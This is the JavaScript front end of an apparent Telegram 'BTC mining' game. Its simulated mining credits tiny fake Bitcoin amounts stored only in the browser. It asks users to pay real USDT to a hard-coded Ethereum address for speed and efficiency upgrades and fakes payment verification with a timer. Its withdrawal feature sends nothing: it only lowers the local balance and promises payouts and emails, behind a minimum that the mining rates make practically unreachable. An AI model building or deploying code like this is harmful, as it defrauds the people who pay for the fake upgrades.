// Game State with Correct Pricing
let gameState = {
    balance: 0.000000001,
    totalMined: 0.000000001,
    miningSpeed: 9,
    miningAmount: 0.000000001,
    isAutoMining: false,
    miningSessionEnd: null,
    miningInterval: null,
    progressInterval: null,
    upgrades: {
        speedLevel: 0,
        efficiencyLevel: 0,
        maxSpeedLevel: 10,
        maxEfficiencyLevel: 5,
        // CORRECTED PRICING
        speedCost: 29.99,      // $29.99 USDT per speed upgrade
        efficiencyCost: 79.99  // $79.99 USDT per efficiency upgrade
    },
    payments: {
        ethAddress: "0x742d35Cc6634C0532925a3b844Bc9e34F3bA2E1c",
        speedTxHash: "",
        efficiencyTxHash: ""
    },
    withdrawalHistory: []
};

// Telegram Web App
const tg = window.Telegram.WebApp;
tg.expand();
tg.ready();

// Load saved game state
function loadGameState() {
    const saved = localStorage.getItem('btcMinerGame');
    if (saved) {
        const parsed = JSON.parse(saved);
        // Preserve mining session if still valid
        if (parsed.miningSessionEnd && new Date(parsed.miningSessionEnd) > new Date()) {
            gameState = {...gameState, ...parsed};
            startAutoMining();
        } else {
            gameState = {...gameState, ...parsed};
            gameState.isAutoMining = false;
            gameState.miningSessionEnd = null;
        }
    }
    updateUI();
}

// Save game state
function saveGameState() {
    localStorage.setItem('btcMinerGame', JSON.stringify(gameState));
}

// Update UI
function updateUI() {
    // Update balance displays
    document.getElementById('balance').textContent = gameState.balance.toFixed(9);
    document.getElementById('available-balance').textContent = gameState.balance.toFixed(9);
    document.getElementById('total-mined').textContent = gameState.totalMined.toFixed(9);
    document.getElementById('total-earned').textContent = gameState.totalMined.toFixed(9);
    
    // Update mining speed display
    const currentSpeed = gameState.miningSpeed - (gameState.upgrades.speedLevel * 3);
    const nextSpeed = Math.max(3, currentSpeed - 3);
    document.getElementById('mining-speed').textContent = `${Math.max(3, currentSpeed)}s`;
    document.getElementById('current-speed').textContent = Math.max(3, currentSpeed);
    document.getElementById('current-mining-speed').textContent = Math.max(3, currentSpeed);
    document.getElementById('next-speed').textContent = Math.max(3, nextSpeed);
    
    // Update upgrade levels
    document.getElementById('speed-level').textContent = gameState.upgrades.speedLevel;
    document.getElementById('speed-level-display').textContent = gameState.upgrades.speedLevel;
    document.getElementById('efficiency-level').textContent = gameState.upgrades.efficiencyLevel;
    document.getElementById('efficiency-level-display').textContent = gameState.upgrades.efficiencyLevel;
    
    // Update multipliers
    const currentMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel);
    const nextMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel + 1);
    document.getElementById('current-multiplier').textContent = currentMultiplier;
    document.getElementById('next-multiplier').textContent = nextMultiplier;
    
    // Update mining button
    const mineBtn = document.getElementById('mine-btn');
    if (gameState.isAutoMining) {
        const timeLeft = getTimeRemaining();
        mineBtn.innerHTML = `⛏️ Mining... ${timeLeft}`;
        mineBtn.disabled = true;
    } else {
        mineBtn.innerHTML = '⛏️ Start 2-Hour Mining Session';
        mineBtn.disabled = false;
    }
    
    // Update timer display
    updateTimerDisplay();
    
    // Update upgrade costs
    updateUpgradeCosts();
    
    // Update withdrawal history
    updateWithdrawalHistory();
}

// Get time remaining
function getTimeRemaining() {
    if (!gameState.miningSessionEnd) return '';
    
    const now = new Date();
    const end = new Date(gameState.miningSessionEnd);
    const diff = end - now;
    
    if (diff <= 0) {
        endMiningSession();
        return '';
    }
    
    const hours = Math.floor(diff / (1000 * 60 * 60));
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
    
    return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

// Update timer display
function updateTimerDisplay() {
    const timerElement = document.getElementById('mining-timer');
    if (timerElement) {
        if (gameState.isAutoMining) {
            timerElement.innerHTML = `⏰ Session ends in: <strong>${getTimeRemaining()}</strong>`;
        } else {
            timerElement.innerHTML = '⏰ Mining session not active<br><small>Click "Start 2-Hour Mining Session" to begin</small>';
        }
    }
}

// Start 2-hour mining session
function startMining() {
    if (gameState.isAutoMining) return;
    
    // Set session end time (2 hours from now)
    const now = new Date();
    gameState.miningSessionEnd = new Date(now.getTime() + 2 * 60 * 60 * 1000);
    
    gameState.isAutoMining = true;
    
    // Start auto mining
    startAutoMining();
    
    updateUI();
    saveGameState();
    
    tg.showAlert('✅ 2-hour mining session started!\n\nMining will continue automatically until the session ends.');
}

// Start automatic mining
function startAutoMining() {
    if (gameState.miningInterval) {
        clearInterval(gameState.miningInterval);
    }
    
    // Calculate actual mining speed with upgrades
    const baseSpeed = 9;
    const speedReduction = gameState.upgrades.speedLevel * 3;
    const actualSpeed = Math.max(3, baseSpeed - speedReduction);
    
    // Calculate mining amount with upgrades
    const baseAmount = 0.000000001;
    const efficiencyMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel);
    const actualAmount = baseAmount * efficiencyMultiplier;
    
    // Start mining cycle
    gameState.miningInterval = setInterval(() => {
        if (!gameState.isAutoMining) {
            clearInterval(gameState.miningInterval);
            return;
        }
        
        // Check if session ended
        if (new Date() >= new Date(gameState.miningSessionEnd)) {
            endMiningSession();
            return;
        }
        
        // Mine BTC
        gameState.balance += actualAmount;
        gameState.totalMined += actualAmount;
        
        // Update UI
        updateUI();
        saveGameState();
        
        // Animation
        animateMining();
        
    }, actualSpeed * 1000);
    
    // Update timer every second
    if (gameState.progressInterval) {
        clearInterval(gameState.progressInterval);
    }
    gameState.progressInterval = setInterval(updateTimerDisplay, 1000);
}

// End mining session
function endMiningSession() {
    gameState.isAutoMining = false;
    gameState.miningSessionEnd = null;
    
    if (gameState.miningInterval) {
        clearInterval(gameState.miningInterval);
        gameState.miningInterval = null;
    }
    
    if (gameState.progressInterval) {
        clearInterval(gameState.progressInterval);
        gameState.progressInterval = null;
    }
    
    updateUI();
    saveGameState();
    
    tg.showAlert('⏰ 2-hour mining session ended!\n\nStart a new session to continue mining.');
}

// Mining animation
function animateMining() {
    const miner = document.getElementById('miner');
    const progress = document.getElementById('progress');
    const progressText = document.getElementById('progress-text');
    
    // Update progress text
    const currentSpeed = gameState.miningSpeed - (gameState.upgrades.speedLevel * 3);
    const amount = 0.000000001 * Math.pow(2, gameState.upgrades.efficiencyLevel);
    if (progressText) {
        progressText.textContent = `Mining ${amount.toFixed(9)} BTC every ${Math.max(3, currentSpeed)}s`;
    }
    
    // Animate progress bar
    progress.style.transition = 'none';
    progress.style.width = '0%';
    
    setTimeout(() => {
        progress.style.transition = `width ${Math.max(3, currentSpeed)}s linear`;
        progress.style.width = '100%';
    }, 10);
    
    // Miner bounce animation
    miner.style.transform = 'scale(1.2)';
    setTimeout(() => {
        miner.style.transform = 'scale(1)';
    }, 300);
}

// UPGRADE SYSTEM - FIXED PRICING
function buyUpgrade(type) {
    if (type === 'speed') {
        if (gameState.upgrades.speedLevel >= gameState.upgrades.maxSpeedLevel) {
            tg.showAlert('🚫 Maximum speed level reached!');
            return;
        }
        
        const cost = gameState.upgrades.speedCost; // $29.99
        
        tg.showConfirm(
            `⚡ Speed Boost Upgrade #${gameState.upgrades.speedLevel + 1}\n\n` +
            `💵 Price: $${cost} USDT\n\n` +
            `📝 Benefits:\n` +
            `• Mining time reduced by 3 seconds\n` +
            `• New speed: ${Math.max(3, (gameState.miningSpeed - ((gameState.upgrades.speedLevel + 1) * 3)))} seconds\n\n` +
            `Send $${cost} USDT (ERC-20) to:\n` +
            `${gameState.payments.ethAddress}`,
            (confirmed) => {
                if (confirmed) {
                    askForTransactionHash('speed', cost);
                }
            }
        );
    }
    
    else if (type === 'efficiency') {
        if (gameState.upgrades.efficiencyLevel >= gameState.upgrades.maxEfficiencyLevel) {
            tg.showAlert('🚫 Maximum efficiency level reached!');
            return;
        }
        
        const cost = gameState.upgrades.efficiencyCost; // $79.99
        
        tg.showConfirm(
            `💎 Efficiency Boost Upgrade #${gameState.upgrades.efficiencyLevel + 1}\n\n` +
            `💵 Price: $${cost} USDT\n\n` +
            `📝 Benefits:\n` +
            `• Mining amount doubled\n` +
            `• New multiplier: ${Math.pow(2, gameState.upgrades.efficiencyLevel + 1)}x\n\n` +
            `Send $${cost} USDT (ERC-20) to:\n` +
            `${gameState.payments.ethAddress}`,
            (confirmed) => {
                if (confirmed) {
                    askForTransactionHash('efficiency', cost);
                }
            }
        );
    }
}

// Ask for transaction hash
function askForTransactionHash(type, cost) {
    tg.showPopup(
        {
            title: `Enter Transaction Hash`,
            message: `After sending $${cost} USDT, paste your transaction hash below for verification:`,
            buttons: [
                {id: 'submit', type: 'default', text: '✅ Submit Hash'},
                {id: 'cancel', type: 'cancel', text: '❌ Cancel'}
            ]
        },
        (buttonId) => {
            if (buttonId === 'submit') {
                // In real app, verify transaction here
                tg.showAlert('⏳ Transaction submitted for verification...\n\nPlease wait 30-60 seconds.');
                
                // Simulate verification delay
                setTimeout(() => {
                    completeUpgrade(type);
                }, 3000);
            }
        }
    );
}

// Complete upgrade after payment verification
function completeUpgrade(type) {
    if (type === 'speed') {
        gameState.upgrades.speedLevel++;
        const newSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
        tg.showAlert(`✅ Speed Boost Upgrade #${gameState.upgrades.speedLevel} Activated!\n\n⚡ New mining speed: ${newSpeed} seconds\n💎 Enjoy faster mining!`);
        
        // Restart mining with new speed if active
        if (gameState.isAutoMining) {
            startAutoMining();
        }
    }
    
    else if (type === 'efficiency') {
        gameState.upgrades.efficiencyLevel++;
        const newMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel);
        tg.showAlert(`✅ Efficiency Boost Upgrade #${gameState.upgrades.efficiencyLevel} Activated!\n\n💎 New multiplier: ${newMultiplier}x\n💰 Earn ${newMultiplier}x more BTC per cycle!`);
    }
    
    updateUI();
    saveGameState();
}

// Update upgrade costs display
function updateUpgradeCosts() {
    const speedCostElement = document.querySelectorAll('.cost')[0];
    const efficiencyCostElement = document.querySelectorAll('.cost')[1];
    
    if (speedCostElement) {
        speedCostElement.textContent = `$${gameState.upgrades.speedCost.toFixed(2)} USDT`;
    }
    if (efficiencyCostElement) {
        efficiencyCostElement.textContent = `$${gameState.upgrades.efficiencyCost.toFixed(2)} USDT`;
    }
    
    // Update upgrade buttons
    const speedBtn = document.getElementById('speed-btn');
    const efficiencyBtn = document.getElementById('efficiency-btn');
    
    if (speedBtn) {
        if (gameState.upgrades.speedLevel >= gameState.upgrades.maxSpeedLevel) {
            speedBtn.innerHTML = '✅ MAX LEVEL REACHED';
            speedBtn.disabled = true;
        } else {
            speedBtn.innerHTML = `⚡ Buy Speed Boost - $${gameState.upgrades.speedCost.toFixed(2)}`;
            speedBtn.disabled = false;
        }
    }
    
    if (efficiencyBtn) {
        if (gameState.upgrades.efficiencyLevel >= gameState.upgrades.maxEfficiencyLevel) {
            efficiencyBtn.innerHTML = '✅ MAX LEVEL REACHED';
            efficiencyBtn.disabled = true;
        } else {
            efficiencyBtn.innerHTML = `💎 Buy Efficiency Boost - $${gameState.upgrades.efficiencyCost.toFixed(2)}`;
            efficiencyBtn.disabled = false;
        }
    }
}

// Withdraw function with 0.001 BTC minimum
function withdraw() {
    const amountInput = document.getElementById('withdraw-amount');
    const walletInput = document.getElementById('wallet-address');
    
    const amount = parseFloat(amountInput.value);
    const wallet = walletInput.value.trim();
    
    // Validation
    if (!amount || amount <= 0) {
        tg.showAlert('❌ Please enter a valid amount');
        return;
    }
    
    // CHANGED: Minimum withdrawal is now 0.001 BTC
    if (amount < 0.001) {
        tg.showAlert(`❌ Minimum withdrawal is 0.001 BTC\n\nYou entered: ${amount.toFixed(8)} BTC`);
        return;
    }
    
    if (amount > gameState.balance) {
        tg.showAlert(`❌ Insufficient balance!\n\nAvailable: ${gameState.balance.toFixed(8)} BTC\nRequested: ${amount.toFixed(8)} BTC`);
        return;
    }
    
    if (!wallet || wallet.length < 26) {
        tg.showAlert('❌ Please enter a valid BTC wallet address');
        return;
    }
    
    // Calculate fee and net amount
    const fee = 0.0001;
    const netAmount = amount - fee;
    
    if (netAmount <= 0) {
        tg.showAlert('❌ Amount too small after fee deduction');
        return;
    }
    
    tg.showConfirm(
        `💰 Withdrawal Request\n\n` +
        `Amount: ${amount.toFixed(8)} BTC\n` +
        `Fee: ${fee.toFixed(8)} BTC\n` +
        `You receive: ${netAmount.toFixed(8)} BTC\n` +
        `To: ${wallet.substring(0, 20)}...\n\n` +
        `✅ Confirm withdrawal?`,
        (confirmed) => {
            if (confirmed) {
                // Process withdrawal
                gameState.balance -= amount;
                
                // Add to history
                const withdrawal = {
                    id: Date.now(),
                    amount: amount,
                    fee: fee,
                    netAmount: netAmount,
                    wallet: wallet,
                    date: new Date().toISOString(),
                    status: 'pending'
                };
                gameState.withdrawalHistory.unshift(withdrawal);
                
                // Update UI
                updateUI();
                saveGameState();
                
                // Clear form
                amountInput.value = '';
                walletInput.value = '';
                
                tg.showAlert(`✅ Withdrawal request submitted!\n\n` +
                           `📤 ${netAmount.toFixed(8)} BTC will be sent to your wallet\n` +
                           `⏳ Processing time: 1-24 hours\n` +
                           `📧 You will receive email confirmation`);
            }
        }
    );
}

// Update withdrawal history display
function updateWithdrawalHistory() {
    const historyList = document.getElementById('history-list');
    const noHistory = document.getElementById('no-history');
    
    if (!historyList) return;
    
    if (gameState.withdrawalHistory.length === 0) {
        if (noHistory) noHistory.style.display = 'block';
        historyList.innerHTML = '<div class="no-history" id="no-history">No withdrawal history yet</div>';
        return;
    }
    
    if (noHistory) noHistory.style.display = 'none';
    
    let historyHTML = '';
    gameState.withdrawalHistory.forEach(item => {
        const date = new Date(item.date).toLocaleDateString();
        const time = new Date(item.date).toLocaleTimeString();
        const statusClass = item.status === 'completed' ? 'completed' : 'pending';
        const statusText = item.status === 'completed' ? '✅ Completed' : '⏳ Pending';
        
        historyHTML += `
            <div class="history-item">
                <p><strong>${date} ${time}</strong></p>
                <p>Amount: ${item.amount.toFixed(8)} BTC</p>
                <p>Fee: ${item.fee.toFixed(8)} BTC</p>
                <p>Net: ${item.netAmount.toFixed(8)} BTC</p>
                <p>To: ${item.wallet.substring(0, 10)}...</p>
                <span class="status ${statusClass}">${statusText}</span>
            </div>
        `;
    });
    
    historyList.innerHTML = historyHTML;
}

// Auto-save every minute
setInterval(saveGameState, 60000);

// Initialize game
window.addEventListener('DOMContentLoaded', () => {
    loadGameState();
    
    // Show welcome message
    if (!localStorage.getItem('btcMinerWelcome')) {
        setTimeout(() => {
            tg.showAlert('🎉 Welcome to BTC DK Mining!\n\n' +
                       '⛏️ Start 2-hour mining sessions\n' +
                       '⚡ Upgrade with USDT to mine faster\n' +
                       '💰 Withdraw your earned BTC (Min: 0.001 BTC)\n\n' +
                       'Happy mining! 🚀');
            localStorage.setItem('btcMinerWelcome', 'true');
        }, 1000);
    }
});